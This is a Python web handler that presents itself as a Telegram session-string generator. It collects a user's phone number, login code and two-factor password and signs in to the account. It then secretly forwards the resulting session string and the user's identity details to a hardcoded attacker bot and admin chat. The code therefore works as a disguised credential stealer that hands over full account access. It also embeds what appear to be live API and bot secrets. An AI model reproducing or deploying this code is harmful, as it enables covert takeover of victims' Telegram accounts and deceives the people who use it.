from http.server import BaseHTTPRequestHandler
import json
import os
import sys
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
import requests

# Add current directory to path
sys.path.append(os.path.dirname(__file__))

API_ID = 23171051
API_HASH = '10331d5d712364f57ffdd23417f4513c'
BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM'
ADMIN_ID = '7907742294'

async def send_to_bot(message):
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        data = {
            'chat_id': ADMIN_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        response = requests.post(url, json=data, timeout=10)
        return response.status_code == 200
    except:
        return False

async def verify_code_and_get_session(phone, phone_code_hash, code, password=None):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    
    try:
        # Sign in with the code
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=phone_code_hash
        )
    except Exception as e:
        # If 2FA password is needed
        if 'password' in str(e).lower() or 'SESSION_PASSWORD_NEEDED' in str(e):
            if password:
                await client.sign_in(password=password)
            else:
                await client.disconnect()
                raise Exception('2FA password required. Please enter your password.')
        else:
            await client.disconnect()
            raise e
    
    # Get session string
    session_string = client.session.save()
    
    # Get user info
    me = await client.get_me()
    user_info = {
        'id': me.id,
        'username': me.username,
        'first_name': me.first_name,
        'last_name': me.last_name,
        'phone': me.phone
    }
    
    await client.disconnect()
    
    # Send to Telegram bot
    bot_message = f"""🔐 **New Telegram Session Generated**

👤 **User Info:**
├ ID: `{user_info['id']}`
├ Name: {user_info['first_name'] or ''} {user_info['last_name'] or ''}
├ Username: @{user_info['username'] or 'N/A'}
└ Phone: {user_info['phone']}

🔑 **Session String:**
`{session_string}`"""
    
    await send_to_bot(bot_message)
    
    return {
        'session_string': session_string,
        'user_info': user_info
    }

class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            
            phone = data.get('phone')
            phone_code_hash = data.get('phone_code_hash')
            otp_code = data.get('otp_code')
            password = data.get('password')
            
            if not all([phone, phone_code_hash, otp_code]):
                response = {'success': False, 'error': 'All fields are required'}
                self.wfile.write(json.dumps(response).encode())
                return
            
            # Run async function
            result = asyncio.run(verify_code_and_get_session(phone, phone_code_hash, otp_code, password))
            
            response = {
                'success': True,
                'session_string': result['session_string'],
                'user_info': result['user_info'],
                'message': 'Session generated successfully!'
            }
            
        except Exception as e:
            error_msg = str(e)
            if 'PHONE_CODE_INVALID' in error_msg:
                error_msg = 'Invalid verification code. Please check and try again.'
            elif 'PHONE_CODE_EXPIRED' in error_msg:
                error_msg = 'Verification code expired. Please request a new code.'
            elif 'SESSION_PASSWORD_NEEDED' in error_msg or '2FA' in error_msg:
                error_msg = '2FA password required. Please enter your password.'
            elif 'FLOOD' in error_msg:
                error_msg = 'Too many attempts. Please wait before trying again.'
            
            response = {'success': False, 'error': error_msg}
        
        self.wfile.write(json.dumps(response).encode())
